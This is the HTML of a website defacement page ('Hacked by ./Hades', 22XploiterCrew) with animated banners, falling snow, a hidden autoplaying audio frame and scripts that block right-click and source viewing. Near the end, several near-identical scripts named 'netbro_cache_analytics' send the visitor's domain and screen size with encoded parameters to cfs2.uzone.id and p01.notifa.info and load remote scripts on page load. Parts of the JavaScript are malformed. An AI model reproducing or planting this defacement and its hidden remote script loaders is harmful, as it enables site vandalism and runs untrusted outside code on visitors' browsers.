


<html lang="en-US">


<head>


  <title>Hacked by ./Hades</title>


  <link rel="icon" type="image/x-icon" href="https://d.top4top.net/p_1043fg01b1.gif">


  <meta content='Owned , Pwndz , Massed , Stamped , Shoot , Hacked by ./Hades' name='description' />


  <meta content='Owned , Pwndz , Massed , Stamped , Shoot , Hacked by ./Hades' name='keywords' />


  <meta content='Owned , Pwndz , Massed , Stamped , Shoot , Hacked by ./Hades' name='Abstract' />


  <meta name="title" content="Hacked by ./Hades">


  <meta name="description" content="Owned , Pwndz , Massed , Stamped , Shoot , Hacked by ./Hades">


  <meta name="keywords" content="Clodme">


  <meta name="googlebot" content="index,follow" />


  <meta name="robots" content="all" />


  <meta name="robots schedule" content="auto" />


  <meta name="distribution" content="global" />


  <meta contact='#' />


</head>


<script type="2901b28ca8ef585c1559b284-text/javascript">


var snowmax=35


var snowcolor=new Array("blue","red")


var snowtype=new Array("Arial Black","Arial Narrow","Times","Comic Sans MS")


var snowletter="*"


var sinkspeed=0.6


var snowmaxsize=22


var snowminsize=8


var snowingzone=1


// Do not edit below this line


var snow=new Array()


var marginbottom


var marginright


var timer


var i_snow=0


var x_mv=new Array();


var crds=new Array();


var lftrght=new Array();


var browserinfos=navigator.userAgent


var ie5=document.all&&document.getElementById&&!browserinfos.match(/Opera/)


var ns6=document.getElementById&&!document.all


var opera=browserinfos.match(/Opera/)


var browserok=ie5||ns6||opera


function randommaker(range) {	rand=Math.floor(range*Math.random()) return rand


}


function initsnow() {


  if (ie5 || opera) {


    marginbottom = document.body.clientHeight	marginright = document.body.clientWidth


  }else if (ns6) {


    marginbottom = window.innerHeight	marginright = window.innerWidth


  }


var snowsizerange=snowmaxsize-snowminsize


for (i=0;i<=snowmax;i++) {


  crds[i] = 0;


  lftrght[i] = Math.random()*15;


  x_mv[i] = 0.03 + Math.random()/10;


  snow[i]=document.getElementById("s"+i)


  snow[i].style.fontFamily=snowtype[randommaker(snowtype.length)]


  snow[i].size=randommaker(snowsizerange)+snowminsize


  snow[i].style.fontSize=snow[i].size


  snow[i].style.color=snowcolor[randommaker(snowcolor.length)]


  snow[i].sink=sinkspeed*snow[i].size/5


  if (snowingzone==1) {


    snow[i].posx=randommaker(marginright-snow[i].size)


  }if (snowingzone==2) {


    snow[i].posx=randommaker(marginright/2-snow[i].size)


  }if (snowingzone==3) {


    snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4


  }	if (snowingzone==4) {


    snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2


  }


  snow[i].posy=randommaker(2*marginbottom-marginbottom-2*snow[i].size)


  snow[i].style.left=snow[i].posx	snow[i].style.top=snow[i].posy


}


  movesnow()


}


function movesnow() {


  for (i=0;i<=snowmax;i++) {


    crds[i] += x_mv[i];


    snow[i].posy+=snow[i].sink


    snow[i].style.left=snow[i].posx+lftrght[i]*Math.sin(crds[i]);


    snow[i].style.top=snow[i].posy


    if (snow[i].posy>=marginbottom-2*snow[i].size || parseInt(snow[i].style.left)>(marginright-3*lftrght[i])){


  	if (snowingzone==1) {


      snow[i].posx=randommaker(marginright-snow[i].size)


    }	if (snowingzone==2) {


      snow[i].posx=randommaker(marginright/2-snow[i].size)


    }	if (snowingzone==3) {


      snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4


    }	if (snowingzone==4) {


      snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2


    }	snow[i].posy=0	}	}


    	var timer=setTimeout("movesnow()",50)


}


for (i=0;i<=snowmax;i++) {


  document.write("<span id='s"+i+"' style='position:absolute;top:-"+snowmaxsize+"'>"+snowletter+"</span>")


}


if (browserok) {


  window.onload=initsnow


}


<script type='text/javascript'>


shortcut={


  all_shortcuts:


  {},add:function(a,b,c)


  {


    var d={type:"keydown",


    propagate:!1,


    disable_in_input:!1,


    target:document,


    keycode:!1};


    if(c)for(var e in d)"undefined"==typeof c[e]&&(c[e]=d[e]);else c=d;d=c.target,"string"==typeofc.target&&(d=document.getElementById(c.target)),


    a=a.toLowerCase(),


    e=function(d){d=d||window.event;


      if(c.disable_in_input){


        var e;d.target?e=d.target:d.srcElement&&(e=d.srcElement),3==e.nodeType&&(e=e.parentNode);if("INPUT"==e.tagName||"TEXTAREA"==e.tagName)return}


        d.keyCode?code=d.keyCode:d.which&&(code=d.which),


        e=String.fromCharCode(code).toLowerCase(),188==code&&(e=","),190==code&&(e=".");


var f=a.split("+"),g=0,


h={"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":":","'":'"',",":"<",".":">",":"?","\":"|"},


i{


  esc:27,


  escape:27,


  tab:9,


  space:32,


  "return":13,


  enter:13,


  backspace:8,


  scrolllock:145,


  scroll_lock:145,


  scroll:145,


  capslock:20,


  caps_lock:20,


  caps:20,


  numlock:144,


  num_lock:144,


  num:144,


  pause:19,


  "break":19,


  insert:45,


  home:36,


  "delete":46,


  end:35,


  pageup:33,page_up:33,


  pu:33,


  pagedown:34,


  page_down:34,


  pd:34,


  left:37,


  up:38,


  right:39,


  down:40,


  f1:112,


  f2:113,


  f3:114,


  f4:115,


  f5:116,


  f6:117,


  f7:118,


  f8:119,


  f9:120,


  f10:121,


  f11:122,


  f12:123},


  j=!1,


  l=!1,


  m=!1,


  n=!1,


  o=!1,


  p=!1,


  q=!1,


  r=!1;


d.ctrlKey&&(n=!0),


d.shiftKey&&(l=!0),


d.altKey&&(p=!0),


d.metaKey&&(r=!0);


for(var s=0;k=f[s],s<f.length;s++)


"ctrl"==k ||"control"==k?(g++,m=!0):"shift"==k?(g++,j=!0):"alt"==k?(g++,o=!0):"meta"==k?(g++,q=!0):1<k.length?i[k]==code&&g++:c.keycode?c.keycode==code&&g++:e==k?g++:h[e]&&d.shiftKey&&(e=h[e],e==k&&g++);


if(g==f.length&&n==m&&l==j&&p==o&&r==q&&(b(d),!c.propagate))


return d.cancelBubble=!0,d.returnValue=!1,d.stopPropagation && (d.stopPropagation(),d.preventDefault()),!1},


this.all_shortcuts[a]={callback:e,target:d,event:c.type},


d.addEventListener?d.addEventListener(c.type,e,!1):


d.attachEvent?d.attachEvent("on"+c.type,e):d["on"+c.type]=e},


remove:function(a)


{var a=a.toLowerCase(),b=this.all_shortcuts[a];


delete this.all_shortcuts[a];


if(b){var a=b.event,c=b.target,b=b.callback;c.detachEvent?c.detachEvent("on"+a,b):c.removeEventListener?c.removeEventListener(a,b,!1):c["on"+a]=!1}}},shortcut.add("Ctrl+U",function(){top.location.href=""});


</script>


</style>


<br><br><br>


<center>


<img src="https://b.top4top.net/p_917hvj1x1.jpg" border="0"><br><style>@import url(http://fonts.googleapis.com/css?family=Gilda+Display);


html {


background:#000;


font-family:Courier new;


text-align:center;


color:#fff -webkit-background-size: cover;


-moz-background-size: cover;


-o-background-size: cover;


background-size: cover;}





.error {


  text-align: center;


  font-family: 'Gilda Display', serif;


  text-align: center; width: 100%;


  height: 120px; margin: auto;


  position: absolute;


  top: 0;


  bottom: 0;


  left: -60px;


  right: 0;


  -webkit-animation: noise-3 1s linear infinite;


  animation: noise-3 1s linear infinite;


  overflow: default;


}


body:after {


  content: './Hades';


  font-family: OCR-A;


  font-size: 100px;


  text-align: center;


  width: 550px;


  margin: auto;


  position: absolute;


  top: 25%;


  bottom: 0;


  left: 0;


  right: 35%;


  opacity: 0;


  color: white;


  -webkit-animation: noise-1 .2s linear infinite;


  animation: noise-1 .2s linear infinite;


}


body:before {


  content: './Hades';


  font-family: OCR-A;


  font-size: 100px;


  text-align: center;


  width: 550px;


  margin: auto;


  position: absolute;


  top: 25%;


  bottom: 0;


  left: 0;


  right: 35%;


  opacity: 0;


  color: white;


  -webkit-animation: noise-2 .2s linear infinite;


  animation: noise-2 .2s linear infinite;


}


.error {


  text-align: center;


  width: 200px;


  height: 60px;


  margin: auto;


  position: absolute;


  top: 280px;


  bottom: 0;


  left: 20px;


  right: 0;


  -webkit-animation: noise-3 1s linear infinite;


  animation: noise-3 1s linear infinite;


}


.info:before {


  content: './Hades';


  font-family: OCR-A;


  font-size: 100px;


  text-align: center;


  width: 800px;


  margin: auto;


  position: absolute;


  top: 20px;


  bottom: 0;


  left: 40px;


  right: 100px;


  opacity: 0;


  color: white;


  -webkit-animation: noise-2 .2s linear infinite;


  animation: noise-2 .2s linear infinite;


}


.info:after {


  content: './Hades';


  font-family: OCR-A;


  font-size: 100px;


  text-align: center;


  width: 800px;


  margin: auto;


  position: absolute;


  top: 20px;


  bottom: 0;


  left: 40px;


  right: 0;


  opacity: 0;


  color: white;


  -webkit-animation: noise-1 .2s linear infinite;


  animation: noise-1 .2s linear infinite;


}


@-webkit-keyframes noise-1 {


  0%,


  20%,


  40%,


  60%,


  70%,


  90%


  {opacity: 0;} 10%


  {opacity: .1;} 50%


  {opacity: .5; left: -6px;} 80%


  {opacity: .3;} 100%


  {opacity: .6; left: 2px;}


}


@keyframes noise-1 {


  0%,


  20%,


  40%,


  60%,


  70%,


  90%


  {opacity: 0;} 10%


  {opacity: .1;} 50%


  {opacity: .5; left: -6px;} 80%


  {opacity: .3;} 100%


  {opacity: .6; left: 2px;}


}


@-webkit-keyframes noise-2 {


  0%,


  20%,


  40%,


  60%,


  70%,


  90%


  {opacity: 0;} 10%


  {opacity: .1;} 50%


  {opacity: .5; left: 6px;} 80%


  {opacity: .3;} 100%


  {opacity: .6; left: -2px;}


}


@keyframes noise-2 {


  0%,


  20%,


  40%,


  60%,


  70%,


  90%


  {opacity: 0;} 10%


  {opacity: .1;} 50%


  {opacity: .5; left: 6px;} 80%


  {opacity: .3;} 100%


  {opacity: .6; left: -2px;}


}


@-webkit-keyframes noise {


  0%,


  3%,


  5%,


  42%,


  44%,


  100%


  {opacity: 1; -webkit-transform: scaleY(1); transform: scaleY(1);} 4.3%


  {opacity: 1; -webkit-transform: scaleY(1.7); transform: scaleY(1.7);} 43%


  {opacity: 1; -webkit-transform: scaleX(1.5); transform: scaleX(1.5);}


}


@keyframes noise {


  0%,


  3%,


  5%,


  42%,


  44%,


  100%


  {opacity: 1; -webkit-transform: scaleY(1); transform: scaleY(1);} 4.3%


  {opacity: 1; -webkit-transform: scaleY(1.7); transform: scaleY(1.7);} 43%


  {opacity: 1; -webkit-transform: scaleX(1.5); transform: scaleX(1.5);}


}


@-webkit-keyframes noise-3 {


  0%,


  3%,


  5%,


  42%,


  44%,


  100%


  {opacity: 1; -webkit-transform: scaleY(1); transform: scaleY(1);} 4.3%


  {opacity: 1; -webkit-transform: scaleY(4); transform: scaleY(4);} 43%


  {opacity: 1; -webkit-transform: scaleX(10) rotate(60deg); transform: scaleX(10) rotate(60deg);}


}


@keyframes noise-3 {


  0%,


  3%,


  5%,


  42%,


  44%,


  100%


  {opacity: 1; -webkit-transform: scaleY(1); transform: scaleY(1);} 4.3%


  {opacity: 1; -webkit-transform: scaleY(4); transform: scaleY(4);} 43%


  {opacity: 1; -webkit-transform: scaleX(10) rotate(60deg); transform: scaleX(10) rotate(60deg);}


}


.wrap {


  top: 30%;


  left: 25%;


  height: 200px;


  margin-top: -100px;


  position: absolute;


}


code {


  color: white;


}


span.blue {


  color: #48beef;


}


span.comment {


  color: #7f8c8d;


}


span.orange {


  color: #f39c12;


}


span.green {


  color: #33cc33;


}


.viewFull {


  font-family:OCR-A;


  color:orange;


  }


} @media only screen and (min-height: 500px) {


.viewFull{ display:none;


  }


}


</style>


<body oncontextmenu="return false" onmousedown="return false" onkeydown="return false">


  <font face=courier new size=3> <font color=white> </font><br> <br><font face=courier new size=3>


    <font color=white>Hacked By <font><br> <br>


      ./Hades<br> <br>


      <font face=courier new size=3> <font face=courier new size=3> <font color=red>Hello World! :D </font><br> <br>


      <font face=courier new size=3> <font color=white>| 22XploiterCrew |</font><br> <br></div></center>


  <script type="2901b28ca8ef585c1559b284-text/javascript">


  if (self==top) {


    function netbro_cache_analytics(fn, callback)


    {


      setTimeout(function() {


        fn();


        callback();


      },


      0);


    }


    function sync(fn) {fn();}


    function requestCfs(){


      var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");


      var idc_glo_r = Math.floor(Math.random()*99999999999);


      var url = idc_glo_url


      +"cfs2.uzone.id/2fn7a2/request"


      + "?id=1"


      + "&enc=9UwkxLgY9"


      + "&params="


      +"4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKU5tjbxhSIrp1yyIP9u4IALt7jocx9%2bzfp%2bKhh4AhdLygPvKRI4Q88x590y3OmdGulTqbQBbDOSc0JA0yaDUNhwCvMA%2bTjme65EgUBq7P%2frAtRZlWbsz7%2b4XUEl8b5UikdfvQeWVanTE%2bW8MtOeQOkAO8w1m1q4wgiYLjVQlMQ6YJ062aRxNCnC5IS1SJei041ZrFr0%2bX8UjCxWsSc4akLxTBllivacf8r%2fUWuNmmFPwl3tqNdWnqVbL7NXEtoqsTuoObHsUWNNVOeR0%2fr%2bE6QmDV%2bys08ceUlMHgu0U27VdPO0Rb19m6K0jlyCXjajvVoGvMt8UVmgFOM%2fSonwtWvHmUFvq2RHw91sl5e2HymZo5gRcu4KHKy1W7P4e1QfDDMrhUQ0Ez0F1p1hS%2bWVWuGx8hrhAC9LKp9xRwebnsL1B2DKTCa58iKN%2fttdk%2bIruWoaFkRqyaU1uoi0Astb%2b78fBQd%2f3tKdSk%2bTTWFtf5Aw%3d"


      + "&idc_r="+idc_glo_r


      + "&domain="


      +document.domain


      +"&sw="


      +screen.width


      +"&sh="


      +screen.height;


      var bsa = document.createElement('script');


      bsa.type = 'text/javascript';


      bsa.async = true;


      bsa.src = url;


      (document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);


    }


    netbro_cache_analytics(requestCfs, function(){});


  };


</script>


<script type="2901b28ca8ef585c1559b284-text/javascript">


if (self==top) {


  function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}


  function sync(fn) {fn();


  }


  function requestCfs(){


    var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");


    var idc_glo_r = Math.floor(Math.random()*99999999999);


    var url = idc_glo_url


    +"p01.notifa.info/3fsmd3/request"


    + "?id=1"


    + "&enc=9UwkxLgY9"


    + "&params=" +"4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mHDcgs8masnzQp44K5GcOrIScrptdq7x3qjBtXMzN7ksd7ZqjDJdx9Ncw00pcLHzXHw5fq0rKPBE%2b7HR6Lh7tpD6CCVf0aoNbnbktWLafNojAwTmqz7fu4Bb9Zm74gKn%2biKGcOEDCmGLv8%2frh0ivbNOpcriLCKI7xq07ONkyvUBG8PESsZTbA1nd%2fP7A4GstwzfDYHSWgVXB5RxdOfz86ucAdTKgxYUF5byTSJwvFk1%2fROAc7K3xI65RXFMn6YDRbIbDUnUT5jrDx1SvorzRslpMpcwy%2bH9jxzVEE4%2fvqhyMVVH%2fs0dVrAoLr4ITPrJK5n4ZSZND7rTg6IaELePsmHs9%2bjzLHXYLxejXvqB%2bqI2vvuInuapQ0u56GOZEgmZz8SrfgOOGQuAOnCODFeMOK73gC5DHhq%2fKTwqzkdcZfSUDu6WL4lT90alYYQe3%2bKpbtSi6NU4ROkt0%3d"


    + "&idc_r="


    +idc_glo_r


    + "&domain="


    +document.domain


    +"&sw="


    +screen.width


    +"&sh="


    +screen.height;


    var bsa = document.createElement('script');


    bsa.type = 'text/javascript';


    bsa.async = true;


    bsa.src = url;


    (document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});


  };


</script>


<script type="2901b28ca8ef585c1559b284-text/javascript">


if (self==top) {


  function netbro_cache_analytics(fn, callback) {


    setTimeout(function() {


      fn();


      callback();


    }


    , 0);


  }


  function sync(fn) {fn();


  }


function requestCfs(){


  var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");


  var idc_glo_r = Math.floor(Math.random()*99999999999);


  var url = idc_glo_url


  + "p01.notifa.info/3fsmd3/request"


  + "?id=1"


  + "&enc=9UwkxLgY9"


  + "&params=" +"4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m3ceBPpTQ3Ov1CB1haLvf6%2f0PjI2gcSPfkRlwkaCkhnMg09DHcL2tfsPwI4ExJaYad5wvxBtR4%2fZgAYHvxfWcnd548UX719qqB%2fZxlmvl2q7t4hl7787mWxGMzULVgiC1SATOzVSKgqB7illiC9qDXKDtHWIpjFymbzKuHandPLFQ%2fEw5FApRGyIMuk%2fxjbUaGKjAupgpG2BkpMg2nigyATov%2b4OK2BETBqEwUdVbOJMQCm5opWprNoEngALcYPnoDQjGaWrHC4CIUY4tTJG6qI0%2fjS8qX1U9SmhuKAWsqBb632sn3vfZ7uOY%2bIoR6yGbPhHj9TvBFFDcNKUAIUqbo%2fHgc%2fROLKuHIkVD3d4cXWPe7smekWvOGWrjTW6mtvoeQVHXRBA1KokDNtjof8nUKvCdNZ2mIowFD100DS01TNFa3kHhDeZ%2fo7jkD9sGoWC1C8MF%2bCWuGKo%3d"


  + "&idc_r="


  +idc_glo_r


  + "&domain="


  +document.domain


  + "&sw="


  +screen.width


  +"&sh="


  +screen.height;


  var bsa = document.createElement('script');


  bsa.type = 'text/javascript';


  bsa.async = true;


  bsa.src = url;


  (document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);


}


netbro_cache_analytics(requestCfs, function(){});


};


</script>


<script type="2901b28ca8ef585c1559b284-text/javascript">


if (self==top) {


  function netbro_cache_analytics(fn, callback) {


    setTimeout(function() {


      fn();


      callback();


    }


    , 0);


  }


  function sync(fn) {fn();


  }


  function requestCfs(){


    var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");


    var idc_glo_r = Math.floor(Math.random()*99999999999);


    var url = idc_glo_url


    + "p01.notifa.info/3fsmd3/request"


    + "?id=1"


    + "&enc=9UwkxLgY9"


    + "&params=" +"4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mHQNIw72FQBUOwFvaR3H32kCJ2XtEZgGZsGNvqIB8y6XXDxd5hV6NkV4x1O9q9HoSRsgI33jWey3x%2fPffqKjuKJXxMXrmR1k%2fTHM2a1%2fjiUSDXDhge3JPrap5h7ZVG2PnjEWqJmdy89U8aM57t131g0QUfYkjz7N85bn2%2bKrWCgEJP6s85Aqw2RDY2swQBigVlq%2bDjV0nPgANNfBeLqBGlfnMa57bx51ix%2bM2XPQyMkmB6VEKcWZPF7uoo%2bPtHUTSA5kcLew%2brbjjDJNMTVhrVvusc99gXFFsSl2e0r8jB83UakjdkGRLSnM7qk%2bTFvB%2bGeQ022YhudWK%2b3QnC8x51clEcemIY20A11tt1zM%2b81PC6xkEwoZfFn%2fQ3CIFGZvMBw6JgDdJ925CfHPTH3jbCNMuMtjoaACgNW0hUcZLa0CTkqfNBAl2SXeKZ8VZ5IJhoZ0c1NeqeSfQfTzCgnccxg%3d%3d"


    + "&idc_r="


    +idc_glo_r


    + "&domain="


    +document.domain


    + "&sw="


    +screen.width


    +"&sh="


    +screen.height;


    var bsa = document.createElement('script');


    bsa.type = 'text/javascript';


    bsa.async = true;


    bsa.src = url;


    (document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);


  }


  netbro_cache_analytics(requestCfs, function(){});


};


</script>


<script type="2901b28ca8ef585c1559b284-text/javascript">


if (self==top) {


  function netbro_cache_analytics(fn, callback) {


    setTimeout(function() {fn();callback();


    }


    , 0);


  }


  function sync(fn) {fn();


  }


  function requestCfs(){


    var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");


    var idc_glo_r = Math.floor(Math.random()*99999999999);


    var url = idc_glo_url


    + "p01.notifa.info/3fsmd3/request"


    + "?id=1"


    + "&enc=9UwkxLgY9"


    + "&params=" +"4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mjJc9Un%2f2VR6BXhZQpuXx8kEAYalwAQvQMEwDC67t3jgKzHHsqSWZOu44BiinH8l9e5MAqVO7FMJ7Gufpf6awopGq9OiEY0Mil2IQM5%2flg71Rq6GX5yXjBjDcXQIrFFcobY0xm7DpobHlVwuXhgxO7siuEddd4hwOXZztejdkX42oIYrVeAeFUKrBHuy7M4GMqaR1JVh5lfc5V4ZcYQ9KWCTXEAcOHrGhTW2DDkftwU7eM09tvcyINX5IjNrwKl79jiadKf1vAuaDbWZ93xcY6HXUu6igayteQbkNuGU3FOX1aIti1nd6j3W6fkp6QDVdb2La4Vmqe7b0j56LHlmzCIQ8pFcsr4%2bNJ9ml6D4opwI72oABe3%2bH7rHbRHXYDEiLWHinjbhwDRbX6XjKZ%2bDGYk9SpO9zZdl4tx3U32FLsiMio8q3bpDa5rmRHG4QA1oKNU5gcU6lgFQP9ZlEOWPoCg%3d%3d"


    + "&idc_r="


    +idc_glo_r


    + "&domain="


    +document.domain


    + "&sw="


    +screen.width


    +"&sh="


    +screen.height;


    var bsa = document.createElement('script');


    bsa.type = 'text/javascript';


    bsa.async = true;


    bsa.src = url;


    (document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);


  }


  netbro_cache_analytics(requestCfs, function(){});


};


</script>


<script type="2901b28ca8ef585c1559b284-text/javascript">


if (self==top) {


  function netbro_cache_analytics(fn, callback) {


    setTimeout(function() {


      fn();


      callback();


    }


    , 0);


  }


  function sync(fn) {


    fn();


  }


  function requestCfs(){


    var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");


    var idc_glo_r = Math.floor(Math.random()*99999999999);


    var url = idc_glo_url


    + "p01.notifa.info/3fsmd3/request"


    + "?id=1"


    + "&enc=9UwkxLgY9"


    + "&params=" +"4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mYwzs1gDpjfqd%2fXlyfsS6t0UI7cr8%2fDP%2bYrmrv5l6z1YMekXF3iBxZWh1QJZDthyAGivm90tLP4WwvbmBnToOfqgYrwx0Czn48ZfzL%2bBCcrsYuq690TwXLSLHptfTaXMeM1gTxzGs8qgfb%2b9ANyOW0Zcnz5ldeQiNHPSHfpMm3syHThQq9Ziddi3FdoMKl13HPVppQMl5aBzQPZAtOAYwmhhKS7jGzol%2bP0ymQgYmriSJroB%2bPz59aY%2bfnvYRKlvPG8Gwh2bRaPXXHuEG1z5UyJn%2ba0vwsu22s2xVBx3REOEqJQ7fBl%2bNNaNW6nGTe82rB3OENbwRNwn%2f%2bId%2f8VgAi8MuwMT4I4uhgL9jU32XIFJ2xRHopWC6II8voPUasZR9neU%2fmc4mNK8sOaGmb8s9vVWGqFnCxL%2f%2f0IBN0Z%2fd9vhXjZ3gmcQ2413jVBzJsEvmKmModOlY3hpR%2b6vcYsoP6Q%3d%3d"


    + "&idc_r="


    +idc_glo_r


    + "&domain="


    +document.domain


    + "&sw="


    +screen.width


    +"&sh="


    +screen.height;


    var bsa = document.createElement('script');


    bsa.type = 'text/javascript';


    bsa.async = true;


    bsa.src = url;


    (document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);


  }


  netbro_cache_analytics(requestCfs, function(){});


};


</script>


<script type="2901b28ca8ef585c1559b284-text/javascript">


if (self==top) {


  function netbro_cache_analytics(fn, callback) {


    setTimeout(function() {


      fn();


      callback();


    }


    , 0);


  }


  function sync(fn) {


    fn();


  }


  function requestCfs(){


    var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");


    var idc_glo_r = Math.floor(Math.random()*99999999999);


    var url = idc_glo_url


    + "p01.notifa.info/3fsmd3/request"


    + "?id=1"


    + "&enc=9UwkxLgY9"


    + "&params=" +"4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mGsxNVQ6HekYzHCa39On8PB3cWmW5EN8FWCPaMJ9B%2fkt6kiHwwjZojyLKQJ6Au%2ftzNys9WHP0G%2fk41OOxsSfvAKeZg8TjFGjNZxGb%2b3E9Gxi8cC1oZx%2b3EB5%2bVM7IPhJrDNn8j7QFfk8pWDjgtZi%2b3V2kWAcslSjYa5EBcrTzoGuyP8D49Q1EWdmvqQS2%2fJtlp7RQHvCFdV80V0QEa9scQc33GXC7YaQuoZOu3MJyzV2P8AwQZ6A5aDoe%2fs249J8W%2baU3UcWsRu9We2KYfhoNA3qiGY0ZDky28oJyFBlo8DEbRK7MTEejDuLJ7Vnne9Nkg9USXn63OuMHStKeD0kafmrXjAFCjNvn%2fTaZoGZ8Cec3L6osqGmZv19leUOm0uVnOky0G9aymekxUbk55YQOWYPCFpikdML%2bXoQ4CE%2bUkSn6Obw98mlgrN1QuqOCFADD"


    + "&idc_r="


    +idc_glo_r


    + "&domain="


    +document.domain


    + "&sw="


    +screen.width


    +"&sh="


    +screen.height;


    var bsa = document.createElement('script');


    bsa.type = 'text/javascript';


    bsa.async = true;


    bsa.src = url;


    (document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);


  }


  netbro_cache_analytics(requestCfs, function(){});


};


</script>


<script type="2901b28ca8ef585c1559b284-text/javascript">


if (self==top) {


  function netbro_cache_analytics(fn, callback) {


    setTimeout(function() {


      fn();


      callback();


    }


    , 0);


  }


  function sync(fn) {


    fn();


  }


  function requestCfs(){


    var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");


    var idc_glo_r = Math.floor(Math.random()*99999999999);


    var url = idc_glo_url


    + "p01.notifa.info/3fsmd3/request"


    + "?id=1"


    + "&enc=9UwkxLgY9"


    + "&params=" +"4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mDDK%2fx5hTSBe5s%2fNUNE8VAAgF%2fh5gNRPMWVbpmvugoHNHhm8Rh2q4U2aVEX7PpH1x0FPQuPp%2bTRhWAsiElCFUFcCWnP34A8oDoxAv77mBqLVsWDsQOonhp7jsY5lhPsRupihRuK95FulyYwlcDmkgIZurrtoqvwA4Vox3yjJG8cPtyrtF64PKPN43ihaxvo0SMHX4NGpKzk8zysZ61pVeCnOEoiScJCT85gLeqvzqL48DVgz4KAu6GPrn6Ho4i%2bChErrM%2fAhn32Db6PhMKGWXnayEy8ZpqGOCCJO4r%2f788tOtpm4kmJoYN%2bzANnOM%2f5AWf91Gqce72Zi00pzClKNxw2jDmjLegULu7UZpOj4mhh5oz%2bZrC49sCY35w3bP3a95er3XK%2bhk2pscxOY2TLdLBxnNOEwUsP5j53EJJaplaVDkfpP%2bhzCPiL8qmNQ19Nd7exCFZH8jLbM%3d"


    + "&idc_r="


    +idc_glo_r


    + "&domain="


    +document.domain


    + "&sw="


    +screen.width


    +"&sh="


    +screen.height;


    var bsa = document.createElement('script');


    bsa.type = 'text/javascript';


    bsa.async = true;


    bsa.src = url;


    (document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);


  }


  netbro_cache_analytics(requestCfs, function(){});


};


</script>


<div style='text-align: right;


position: fixed;


z-index:9999999;


bottom: 0;


width: 100%;


cursor: pointer;line-height: 0;


display:block !important;'>


</a>


</div>


<script type="2901b28ca8ef585c1559b284-text/javascript">


if (self==top) {


  function netbro_cache_analytics(fn, callback) {


    setTimeout(function() {


      fn();


      callback();


    }


    , 0);


  }


  function sync(fn) {


    fn();


  }


  function requestCfs(){


    var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");


    var idc_glo_r = Math.floor(Math.random()*99999999999);


    var url = idc_glo_url


    + "p01.notifa.info/3fsmd3/request"


    + "?id=1"


    + "&enc=9UwkxLgY9"


    + "&params=" +"4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mx9ZzfrDIUBbCgGpzvHmQHg17zbA0uBx6C252nXTYMvjZM1rjShZWdpqAl4ELBjemxrrcNFcBxjA5w%2bp9jqhRwedgYulry8cu%2bGE54NVVoqe%2bokpnCFxdksA8ehSyTkTIZabYEAT%2bkPD6ofmw6mWU8%2flogfCnKREr4MnKsbLIl8J3zY063qbohi2fpG2N6HMl9ac48Pcsg7Y%2fqf7v4MbbSwALD2z%2bO9gFGJuM5TQr3be%2fcaZgAhXsGNLOljq9JV8ssxN1VMmx%2bhWg7sJbLsGVkuU165R%2bTciqumEVe%2bDvlAw0ke96%2fHyUUfKvZNsiWaj68bLbAfdODNY4rIFy%2b8D1OVL4SKh0TOVPrvoUD64kzMhI41neaxislxiNkW6QAYoNnkmIgEvKDStLa5QupJBz6yMEpeZBEWuUCly95FeTllWaxTnxPCEIEkyYewFC6USN6CAtl5Z6wmU%3d"


    + "&idc_r="


    +idc_glo_r


    + "&domain="


    +document.domain


    + "&sw="


    +screen.width


    +"&sh="


    +screen.height;


    var bsa = document.createElement('script');


    bsa.type = 'text/javascript';


    bsa.async = true;


    bsa.src = url;


    (document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);


  }


  netbro_cache_analytics(requestCfs, function(){});


};


</script>


<div style='text-align: right;


position: fixed;


z-index:9999999;


bottom: 0;


width: 100%;


cursor: pointer;


line-height: 0;


display:block !important;'>


</div>


<iframe width="0" height="0" src="https://a.top4top.net/m_1019t8t4y1.mp3" frameborder="0" allowfullscreen>


</iframe>


